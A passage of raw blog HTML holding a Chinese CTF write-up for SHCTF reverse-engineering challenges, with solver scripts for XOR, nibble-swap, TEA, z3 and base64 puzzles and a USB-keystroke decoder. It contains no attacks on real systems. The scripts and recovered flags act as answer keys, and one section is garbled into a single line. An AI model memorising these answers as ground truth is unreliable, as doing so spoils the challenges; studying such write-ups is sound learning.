v[<span class="number">2</span>])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">1640531527</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i, sum = -(<span class="number">1640531527</span> * <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        </span><br><span class="line">        v1 -= ((v0 &gt;&gt; <span class="number">5</span>) + <span class="number">4</span>) ^ ((<span class="number">16</span> * v0) + <span class="number">3</span>) ^ (sum + v0);</span><br><span class="line">        v0 -= ((v1 &gt;&gt; <span class="number">5</span>) + <span class="number">2</span>) ^ ((<span class="number">16</span> * v1) + <span class="number">2</span>) ^ (sum + v1);</span><br><span class="line">        sum += <span class="number">1640531527</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：%x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">8</span>] = &#123; <span class="number">0xBDBDF9F0</span>, <span class="number">0xE26194C4</span>, <span class="number">0x80799125</span>, <span class="number">0x1F0FC219</span>, <span class="number">0xEB6A1815</span>, <span class="number">0x84F572C5</span>, <span class="number">0x40CC3A85</span>, <span class="number">0xD2A32ABB</span> &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> flag[<span class="number">2</span>] = &#123; <span class="number">0x0</span>,<span class="number">0x0</span> &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> pqw[<span class="number">2</span>] = &#123; <span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;Y&#x27;</span> &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>] = &#123; <span class="number">0x00000020</span>, <span class="number">0x0000001B</span>, <span class="number">0x00000027</span>, <span class="number">0x0000002C</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i, r = <span class="number">32</span>;<span class="comment">//num_rounds建议取值为32</span></span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    <span class="comment">//printf(&quot;加密前原始数据：%u %u\n&quot;, v[0],v[1]);</span></span><br><span class="line">    <span class="comment">//encipher(r, v, k);</span></span><br><span class="line">    <span class="comment">//printf(&quot;加密后的数据：%u %u\n&quot;, v[0], v[1]);</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[<span class="number">0</span>] = v[i];</span><br><span class="line">        flag[<span class="number">1</span>] = v[i + <span class="number">1</span>];</span><br><span class="line">       <span class="comment">// encipher(r, flag);</span></span><br><span class="line">        decipher(r, flag);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="number">2157182970</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-SHCTF" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/10/02/SHCTF/" class="article-date">
  	<time datetime="2023-10-02T10:19:44.000Z" itemprop="datePublished">2023-10-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/10/02/SHCTF/">
        SHCTF
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="WEEK1-ez-asm"><a href="#WEEK1-ez-asm" class="headerlink" title="[WEEK1]ez_asm"></a>[WEEK1]ez_asm</h3><p>简单的asm代码，直接对照的逻辑逆向即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;nhuo[M`7mc7uhc$7midgbTf`7`$7%#ubf7 ci5Y&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">  </span><br><span class="line">  c = flag[i] </span><br><span class="line">  c = <span class="built_in">ord</span>(c)+<span class="number">0xA</span></span><br><span class="line">  flag = flag[:i] + <span class="built_in">chr</span>(c) + flag[i+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">  c = flag[i]</span><br><span class="line">  c = <span class="built_in">ord</span>(c)^<span class="number">0x1E</span></span><br><span class="line">  flag = flag[:i] + <span class="built_in">chr</span>(c) + flag[i+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="WEEK1-easy-re"><a href="#WEEK1-easy-re" class="headerlink" title="[WEEK1]easy_re"></a>[WEEK1]easy_re</h3><p>他的加密算法就是把字符串的高位变到低位，地位变到高位而已，直接写代码进行替换</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">des =[</span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0xC6</span>, <span class="number">0x16</span>, <span class="number">0x76</span>, <span class="number">0xB7</span>, <span class="number">0x45</span>, <span class="number">0x27</span>, <span class="number">0x97</span>, <span class="number">0xF5</span>, <span class="number">0x47</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0xF5</span>, <span class="number">0x37</span>, <span class="number">0x03</span>, <span class="number">0xC6</span>, <span class="number">0x67</span>, <span class="number">0x33</span>, <span class="number">0xF5</span>, <span class="number">0x47</span>, <span class="number">0x86</span>, </span><br><span class="line">  <span class="number">0x56</span>, <span class="number">0xF5</span>, <span class="number">0x26</span>, <span class="number">0x96</span>, <span class="number">0xE6</span>, <span class="number">0x16</span>, <span class="number">0x27</span>, <span class="number">0x97</span>, <span class="number">0xF5</span>, <span class="number">0x07</span>, </span><br><span class="line">  <span class="number">0x27</span>, <span class="number">0x03</span>, <span class="number">0x26</span>, <span class="number">0xC6</span>, <span class="number">0x33</span>, <span class="number">0xD6</span>, <span class="number">0xD7</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> des:</span><br><span class="line">  high = (<span class="built_in">ord</span>(<span class="built_in">chr</span>(c)) &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span></span><br><span class="line">  low = (<span class="built_in">ord</span>(<span class="built_in">chr</span>(c)) &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span></span><br><span class="line">  orig = high | low</span><br><span class="line">  </span><br><span class="line">  result += <span class="built_in">chr</span>(orig)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h3 id="WEEK1-seed"><a href="#WEEK1-seed" class="headerlink" title="[WEEK1]seed"></a>[WEEK1]seed</h3><p>IDA分析得知就是简单的通过伪随机数获取10个数，然后和flag进行异或，难点在于伪随机数为多少，我们动调后发现他的伪随机数是0</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">50</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">10</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> des[<span class="number">45</span>] = &#123;</span><br><span class="line">        <span class="number">0x40</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0xE9</span>, <span class="number">0xC2</span>, <span class="number">0x04</span>, <span class="number">0xA4</span>, <span class="number">0xED</span>, <span class="number">0x9F</span>, <span class="number">0x53</span>, <span class="number">0x5F</span>, <span class="number">0x75</span>, <span class="number">0x3C</span>, <span class="number">0xD1</span>, <span class="number">0xCD</span>, <span class="number">0x2B</span>, <span class="number">0xA8</span>,</span><br><span class="line">        <span class="number">0xC4</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x15</span>, <span class="number">0x21</span>, <span class="number">0x16</span>, <span class="number">0xEF</span>, <span class="number">0xD7</span>, <span class="number">0x27</span>, <span class="number">0x92</span>, <span class="number">0xDF</span>, <span class="number">0xCA</span>, <span class="number">0x53</span>, <span class="number">0x5F</span>, <span class="number">0x2A</span>, <span class="number">0x3C</span>, <span class="number">0xD1</span>,</span><br><span class="line">        <span class="number">0xCE</span>, <span class="number">0x03</span>, <span class="number">0xA3</span>, <span class="number">0xEF</span>, <span class="number">0xA5</span>, <span class="number">0x78</span>, <span class="number">0x16</span>, <span class="number">0x1A</span>, <span class="number">0x2D</span>, <span class="number">0xE1</span>, <span class="number">0xC4</span></span><br><span class="line">    &#125;; <span class="comment">// 密文</span></span><br><span class="line"></span><br><span class="line">    srand(<span class="number">0</span>); <span class="comment">// 设置随机种子为当前时间</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        key[i] = rand() % <span class="number">255</span>; <span class="comment">// 随机生成key</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++) &#123;</span><br><span class="line">        des[i] ^= key[i % <span class="number">10</span>]; <span class="comment">// 异或加密</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, des[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="WEEK1-signin"><a href="#WEEK1-signin" class="headerlink" title="[WEEK1]signin"></a>[WEEK1]signin</h3><p>IDA打开后直接</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.zvde9hyzyog.png"></p>
<h3 id="WEEK1-easy-math"><a href="#WEEK1-easy-math" class="headerlink" title="[WEEK1]easy_math"></a>[WEEK1]easy_math</h3><p>直接z3约束求解即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个符号变量数组l，包含6个整数变量</span></span><br><span class="line">l = [Int(<span class="string">&#x27;l%d&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个Z3求解器</span></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加方程组</span></span><br><span class="line">solver.add(</span><br><span class="line">    (<span class="number">593</span> * l[<span class="number">0</span>] + <span class="number">997</span> * l[<span class="number">1</span>] + <span class="number">811</span> * l[<span class="number">2</span>] + <span class="number">258</span> * l[<span class="number">3</span>] + <span class="number">829</span> * l[<span class="number">4</span>] + <span class="number">532</span> * l[<span class="number">5</span>]) == <span class="number">0x5b8e0aef71d34ff43</span>,</span><br><span class="line">    (<span class="number">605</span> * l[<span class="number">0</span>] + <span class="number">686</span> * l[<span class="number">1</span>] + <span class="number">328</span> * l[<span class="number">2</span>] + <span class="number">602</span> * l[<span class="number">3</span>] + <span class="number">695</span> * l[<span class="number">4</span>] + <span class="number">576</span> * l[<span class="number">5</span>]) == <span class="number">0x551a262360964ef7f</span>,</span><br><span class="line">    (<span class="number">373</span> * l[<span class="number">0</span>] + <span class="number">512</span> * l[<span class="number">1</span>] + <span class="number">449</span> * l[<span class="number">2</span>] + <span class="number">756</span> * l[<span class="number">3</span>] + <span class="number">448</span> * l[<span class="number">4</span>] + <span class="number">580</span> * l[<span class="number">5</span>]) == <span class="number">0x49d158a5657d6931c</span>,</span><br><span class="line">    (<span class="number">560</span> * l[<span class="number">0</span>] + <span class="number">635</span> * l[<span class="number">1</span>] + <span class="number">422</span> * l[<span class="number">2</span>] + <span class="number">971</span> * l[<span class="number">3</span>] + <span class="number">855</span> * l[<span class="number">4</span>] + <span class="number">597</span> * l[<span class="number">5</span>]) == <span class="number">0x625568d5abbabf4f3</span>,</span><br><span class="line">    (<span class="number">717</span> * l[<span class="number">0</span>] + <span class="number">507</span> * l[<span class="number">1</span>] + <span class="number">388</span> * l[<span class="number">2</span>] + <span class="number">925</span> * l[<span class="number">3</span>] + <span class="number">324</span> * l[<span class="number">4</span>] + <span class="number">524</span> * l[<span class="number">5</span>]) == <span class="number">0x50ee0c025e70e3c23</span>,</span><br><span class="line">    (<span class="number">312</span> * l[<span class="number">0</span>] + <span class="number">368</span> * l[<span class="number">1</span>] + <span class="number">884</span> * l[<span class="number">2</span>] + <span class="number">518</span> * l[<span class="number">3</span>] + <span class="number">495</span> * l[<span class="number">4</span>] + <span class="number">414</span> * l[<span class="number">5</span>]) == <span class="number">0x40e735f8aa2815f65</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否存在解</span></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    result = [model[l[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Solution found:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution found.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    result[i]=<span class="built_in">hex</span>(result[i])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(result[i][<span class="number">2</span>:][j*<span class="number">2</span>:j*<span class="number">2</span>+<span class="number">2</span>],<span class="number">16</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="WEEK1-ez-apk"><a href="#WEEK1-ez-apk" class="headerlink" title="[WEEK1]ez_apk"></a>[WEEK1]ez_apk</h3><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1p56go1mdb0g.png"></p>
<p>我们分析代码，发现了加密函数，这段时一个base58的码表转换，但最后直接给了加密后的码表</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1t2a0v5wtabk.webp"></p>
<p>我们在mainactivity中点击smail代码，找到原始数据，直接base58换表解密即可</p>
<p>x mappings &#x3D; { 0x04:”A”,  0x05:”B”,  0x06:”C”, 0x07:”D”, 0x08:”E”, 0x09:”F”, 0x0A:”G”,  0x0B:”H”, 0x0C:”I”,  0x0D:”J”, 0x0E:”K”, 0x0F:”L”, 0x10:”M”, 0x11:”N”,0x12:”O”,  0x13:”P”, 0x14:”Q”, 0x15:”R”, 0x16:”S”, 0x17:”T”, 0x18:”U”,0x19:”V”, 0x1A:”W”, 0x1B:”X”, 0x1C:”Y”, 0x1D:”Z”, 0x1E:”1”, 0x1F:”2”, 0x20:”3”, 0x21:”4”, 0x22:”5”,  0x23:”6”, 0x24:”7”, 0x25:”8”, 0x26:”9”, 0x27:”0”, 0x28:”\n”, 0x2a:”[DEL]”,  0X2B:”    “, 0x2C:” “,  0x2D:”-“, 0x2E:”&#x3D;”, 0x2F:”[“,  0x30:”]”,  0x31:”\“, 0x32:”~”, 0x33:”;”,  0x34:”‘“, 0x36:”,”,  0x37:”.” }nums &#x3D; []keys &#x3D; open(‘usbdata.txt’)for line in keys:    if line[0]!&#x3D;’0’ or line[1]!&#x3D;’0’ or line[3]!&#x3D;’0’ or line[4]!&#x3D;’0’ or line[9]!&#x3D;’0’ or line[10]!&#x3D;’0’ or line[12]!&#x3D;’0’ or line[13]!&#x3D;’0’ or line[15]!&#x3D;’0’ or line[16]!&#x3D;’0’ or line[18]!&#x3D;’0’ or line[19]!&#x3D;’0’ or line[21]!&#x3D;’0’ or line[22]!&#x3D;’0’:         continue    nums.append(int(line[6:8],16))keys.close()output &#x3D; “”for n in nums:    if n &#x3D;&#x3D; 0 :        continue    if n in mappings:        output +&#x3D; mappings[n]    else:        output +&#x3D; ‘[unknown]’print(‘output :\n’ + output)​# output :# SEC2ETK3YPython</p>
<h3 id="WEEK2-pycode"><a href="#WEEK2-pycode" class="headerlink" title="[WEEK2]pycode"></a>[WEEK2]pycode</h3><p>直接gpt将py字节码转换成普通的代码形式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;*******************&#x27;</span></span><br><span class="line">value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">output = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    w = <span class="number">1024</span></span><br><span class="line">    x = w % <span class="number">3</span></span><br><span class="line">    y = w // <span class="number">9</span></span><br><span class="line">    z = x * y</span><br><span class="line">    w -= z</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    w = <span class="number">20</span></span><br><span class="line">    x = w % <span class="number">6</span></span><br><span class="line">    y = w // <span class="number">3</span></span><br><span class="line">    z = x * y</span><br><span class="line">    w += z</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    w = <span class="number">1024</span></span><br><span class="line">    x = w % <span class="number">3</span></span><br><span class="line">    y = w // <span class="number">9</span> </span><br><span class="line">    z = x * y</span><br><span class="line">    w -= z</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    w = <span class="number">20</span></span><br><span class="line">    x = w % <span class="number">6</span></span><br><span class="line">    y = w // <span class="number">3</span></span><br><span class="line">    z = x * y </span><br><span class="line">    w += z</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    temp = flag[i]</span><br><span class="line">    temp = <span class="built_in">chr</span>(<span class="built_in">ord</span>(temp) ^ <span class="number">8</span>)</span><br><span class="line">    value += temp</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    temp = value[i]</span><br><span class="line">    temp = <span class="built_in">chr</span>(<span class="built_in">ord</span>(temp) + <span class="number">3</span>)</span><br><span class="line">    output += temp</span><br><span class="line">    </span><br><span class="line">obfuscated_output = base64.b64encode(output.encode()).decode()</span><br><span class="line">obfuscated_output = obfuscated_output[:-<span class="number">1</span>]</span><br><span class="line">obfuscated_output = obfuscated_output.replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">obfuscated_output = obfuscated_output.replace(<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">obfuscated_output = obfuscated_output.replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(obfuscated_output)</span><br></pre></td></tr></table></figure>

<p>我们可以看到前面基本都是混淆的，我们只需要从后往前慢慢还原就好了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a=<span class="string">&#x27;==AeAF3M-tzO-giQ-AUQosDQ9tGK7MDPuhC47tDNB5Tb8Yn4sdW4&#x27;</span></span><br><span class="line"></span><br><span class="line">a=a.replace(<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">a=a.replace(<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">a=a.replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a=a[::-<span class="number">1</span>]</span><br><span class="line">a=base64.decodebytes(a.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">a=a.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">a=<span class="built_in">list</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i]=(<span class="built_in">ord</span>(a[i])-<span class="number">3</span>)^<span class="number">8</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="WEEK2-Authur’s-box"><a href="#WEEK2-Authur’s-box" class="headerlink" title="[WEEK2]Authur’s_box"></a>[WEEK2]Authur’s_box</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">0xAD</span>,<span class="number">0xA7</span>,<span class="number">0xAA</span>,<span class="number">0xAC</span>,<span class="number">0xB0</span>,<span class="number">0xF8</span>,<span class="number">0xA8</span>,<span class="number">0xFE</span>,<span class="number">0xAF</span>,<span class="number">0xFF</span>,<span class="number">0xF3</span>,<span class="number">0xA9</span>,<span class="number">0xA8</span>,<span class="number">0xE6</span>,<span class="number">0xFF</span>,<span class="number">0xFE</span>,<span class="number">0xF2</span>,<span class="number">0xFE</span>,<span class="number">0xE6</span>,<span class="number">0xFF</span>,<span class="number">0xFC</span>,<span class="number">0xF2</span>,<span class="number">0xAD</span>,<span class="number">0xE6</span>,<span class="number">0xA9</span>,<span class="number">0xFD</span>,<span class="number">0xFF</span>,<span class="number">0xF9</span>,<span class="number">0xE6</span>,<span class="number">0xA8</span>,<span class="number">0xAD</span>,<span class="number">0xA8</span>,<span class="number">0xF2</span>,<span class="number">0xA8</span>,<span class="number">0xAD</span>,<span class="number">0xFD</span>,<span class="number">0xF3</span>,<span class="number">0xAF</span>,<span class="number">0xF3</span>,<span class="number">0xAD</span>,<span class="number">0xFA</span>,<span class="number">0xB0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i]=a[i]^<span class="number">0xcb</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="WEEK2-签到题？"><a href="#WEEK2-签到题？" class="headerlink" title="[WEEK2]签到题？"></a>[WEEK2]签到题？</h3><p>这个题做的我有点懵逼，该说不说确实是签到</p>
<p>直接动调取值，取出值后直接base64解密就得出flag了</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031124243081.png" alt="image-20231031124243081"></p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031124515480.png" alt="image-20231031124515480"></p>
<h3 id="WEEK2-not-gcc"><a href="#WEEK2-not-gcc" class="headerlink" title="[WEEK2]not gcc"></a>[WEEK2]not gcc</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/pc153262603/article/details/89553688">clang llc llvm 常用编译指令-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ren-ctfnote/p/14948764.html">2021CISCN-逆向-baby.bc-部分知识点总结 - re0juren - 博客园 (cnblogs.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang baby.bc -o baby</span><br></pre></td></tr></table></figure>

<p>直接用命令把.bc文件编译成可执行文件，然后开始操作。分析代码</p>
<p>我们分析代码发现关键函数是sudoku函数,代码逻辑就是我们输入正确的81位数独的值，然后他把他提供的数独的值置为0，然后把未知的置为我们求出来的数独的值（有点绕）</p>
